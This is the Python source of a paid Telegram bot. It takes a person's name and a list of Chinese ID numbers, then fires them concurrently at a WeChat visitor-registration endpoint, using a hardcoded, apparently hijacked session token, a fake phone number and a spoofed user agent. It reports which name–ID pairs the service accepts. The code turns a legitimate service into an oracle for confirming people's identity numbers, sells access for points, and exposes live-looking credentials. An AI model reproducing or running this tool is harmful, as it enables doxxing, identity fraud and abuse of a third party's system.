import telebot
import requests
import time
import re
import threading
import json
import os
from concurrent.futures import ThreadPoolExecutor

# ================= 配置区 =================
API_TOKEN = '8417331227:AAESrsOPgEDMeu7NHgLMgoZrynkxoafBLBY'
ADMIN_ID = 6649617045 
CURRENT_X_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJsaXVjYWkiLCJzdWIiOiJ3ZWNoYXQ6bzhiQ2w2MmtyUUVwRzZHTmlaaF9YczhrcHBXVSIsImF1ZCI6WyJjZGN5cHciXSwiZXhwIjoxNzcwMDYwNTkzLCJuYmYiOjE3NzAwNDk3OTMsImlhdCI6MTc3MDA0OTc5MywianRpIjoiZjZjZDUxOTQtMDIyZS00YWIxLWI1NzUtNmQyYTc0YWI1MTUwIiwidXNlcl90eXBlIjoid2VjaGF0LXZpcCIsInVzZXJfaWQiOjMwMDQ1OH0.E8QrvHjur1JZPh2K43_ppaMq6NxQWj2EcSTP3AfRnsQAlIvOJwHAOXmCrDOQMFIbsO6dPyAmTV3CznKPrUkIZQ"

# 初始化
bot = telebot.TeleBot(API_TOKEN)
user_states = {}
POINTS_FILE = 'points.json'

# --- 积分存取逻辑 ---
def load_points():
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                # json存的是字符串key，转回int
                data = json.load(f)
                return {int(k): v for k, v in data.items()}
        except: return {}
    return {}

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump(user_points, f)

user_points = load_points()

# --- 身份证校验逻辑 ---
def is_valid_id(n):
    n = str(n).upper()
    if len(n) != 18: return False
    try:
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17]
    except: return False

# --- 核心核验任务 ---
def run_batch_task(chat_id, msg_id, name, id_list):
    global CURRENT_X_TOKEN
    headers = {
        "X-Token": CURRENT_X_TOKEN,
        "content-type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68"
    }
    
    total = len(id_list)
    success_results = []
    done = 0
    is_running = True
    token_expired = False

    def progress_monitor():
        nonlocal done, is_running
        last_percent = -1
        while is_running:
            if total > 0:
                percent = int(done / total * 100)
                if percent != last_percent:
                    progress_idx = int(percent / 10)
                    bar = "█" * progress_idx + "░" * (10 - progress_idx)
                    try:
                        bot.edit_message_text(
                            chat_id=chat_id, message_id=msg_id,
                            text=f"🔍 **正在核验...**\n📊 `{bar}` **{percent}%**\n🔢 `{done}` / `{total}`",
                            parse_mode='Markdown'
                        )
                        last_percent = percent
                    except: pass
            time.sleep(2)

    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running, token_expired
        if not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=6)
            res_data = r.json()
            if res_data.get("code") == 401:
                token_expired = True
                is_running = False
                return
            if res_data.get("code") == 0:
                success_results.append(f"`{name} {id_no}` 二要素验证成功✅")
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(verify, id_list)

    is_running = False 
    time.sleep(1)

    if token_expired:
        bot.send_message(chat_id, "🚨 Token 过期，请联系管理员。")
        return

    if success_results:
        bot.send_message(chat_id, "\n".join(success_results), parse_mode='Markdown')
    else:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"❌ 核验完成，未发现匹配。")

# --- 管理员指令 ---
@bot.message_handler(commands=['add'])
def add_points(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        parts = message.text.split()
        target_id = int(parts[1])
        amount = int(parts[2])
        user_points[target_id] = user_points.get(target_id, 0) + amount
        save_points()  # 存盘
        bot.reply_to(message, f"✅ 已更新！用户 `{target_id}` 当前积分: `{user_points[target_id]}`", parse_mode='Markdown')
    except:
        bot.reply_to(message, "❌ 格式: `/add 用户ID 分数` (如: `/add 123456 500`)", parse_mode='Markdown')

@bot.message_handler(commands=['set_token'])
def set_token_command(message):
    if message.from_user.id != ADMIN_ID: return
    msg = bot.send_message(message.chat.id, "🗝 请发送新的 X-Token:")
    bot.register_next_step_handler(msg, update_token)

def update_token(m):
    global CURRENT_X_TOKEN
    CURRENT_X_TOKEN = m.text.strip()
    bot.send_message(m.chat.id, "✅ Token 已更新")

# --- 用户指令 ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    points = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"👋 您好！您的ID: `{uid}`\n💰 当前积分: `{points}`\n💡 每次核验消耗 50 积分。\n\n请输入姓名:", parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'get_name'}

@bot.message_handler(func=lambda m: user_states.get(m.chat.id, {}).get('step') == 'get_name')
def get_name(message):
    user_states[message.chat.id] = {'step': 'get_ids', 'name': message.text.strip()}
    points = user_points.get(message.from_user.id, 0)
    bot.send_message(message.chat.id, f"请发送身份证号列表:")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id, {}).get('step') == 'get_ids')
def get_ids(message):
    uid = message.from_user.id
    current_p = user_points.get(uid, 0)
    
    if current_p < 50:
        bot.reply_to(message, f"❌ 积分不足！\n当前积分: `{current_p}`\n请联系管理员充值。", parse_mode='Markdown')
        return

    data = user_states.get(message.chat.id)
    raw_ids = re.findall(r'\d{17}[\dXx]', message.text)
    valid_ids = [i for i in raw_ids if is_valid_id(i)]
    
    if not valid_ids:
        bot.reply_to(message, "❌ 未识别到有效号码。")
        return

    # 扣除积分并存盘
    user_points[uid] = current_p - 50
    save_points() 
    
    status_msg = bot.send_message(message.chat.id, f"⚙ 扣除50积分，剩余 `{user_points[uid]}`，开始核验...", parse_mode='Markdown')
    threading.Thread(target=run_batch_task, args=(message.chat.id, status_msg.message_id, data['name'], valid_ids)).start()
    del user_states[message.chat.id]

if __name__ == '__main__':
    print("--- 积分存档版机器人启动中... ---")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
